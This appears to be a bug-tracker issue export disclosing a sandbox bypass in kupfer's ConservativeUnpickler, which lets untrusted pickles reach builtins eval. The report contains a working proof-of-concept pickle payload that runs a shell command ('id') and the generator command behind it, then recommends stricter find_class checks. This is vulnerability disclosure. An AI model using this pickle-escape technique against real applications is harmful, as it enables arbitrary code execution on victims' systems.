{"author":{"id":"786b3200543b99fffe784539984150e793b3cb1fd2e66881b13310ced1c8764c"},"ops":[{"type":1,"timestamp":1650820288,"nonce":"DGBJQpxEDAbV23Al0oVxyHG4MxI=","title":"bug w serializacji","message":"Description\n\nWe have a ConservativeUnpickler to provide a safe way to deserialize objects. But the implementation seems not really safe and basically bypassable.\n\nIt uses \"kupfer.*\" : universalset() to allow all the functions / objects / classes under kupfer.* modules. But there are actually a lot of internal objects \u0026 functions in Python.\n\nThere is a hidden attribute __builtins__ in every module, which is the dict type of builtins module. And the Unpickler.find_class method is different from normal from ... import ... syntax, it allows import things deeper. In this case, we can use Unpickler.find_class(\"kupfer.conspickle\", \"__builtins__.get\") to get the get method of that builtins dict.\n\nNow we can get arbitrary function from builtins, which means eval, 'exec' is a low hanging fruit -- we are able to execute any Python code now.\nProof of Concept\n\nI use my toy compiler to generate the pickle bytecode. Exploit should execute code: __import__('os').system('id').\n\nfrom kupfer.conspickle import ConservativeUnpickler\npickle_bytecode = b'\\x80\\x04\\x95]\\x00\\x00\\x00\\x00\\x00\\x00\\x00(ckupfer.conspickle\\n__builtins__.get\\n\\x94h\\x00\\x94h\\x01\\x8c\\x04eval\\x85R\\x94h\\x02\\x94h\\x03\\x8c\\x1d__import__(\"os\").system(\"id\")\\x85R1N.'\nConservativeUnpickler.loads(pickle_bytecode)\n\nBytecode is generated by the following command:\n\npython3 pickora.py -c \"g=GLOBAL('kupfer.conspickle', '__builtins__.get'); eval=g('eval'); eval('__import__(\\\"os\\\").system(\\\"id\\\")')\"\n\nImpact\n\nThis vulnerability is capable of arbitrary code execution.\nThe Proper Way?\n\nA better way to restrict globals is restricting both module and name in find_class at the same time, just like what the documet do -- even though you trust a module.\n\n\nhttps://docs.python.org/3/library/pickle.html#restricting-globals","files":null},{"type":4,"timestamp":1651506742,"nonce":"X5kaxm8wVf1s1tfJt16mislMbRQ=","status":2}]}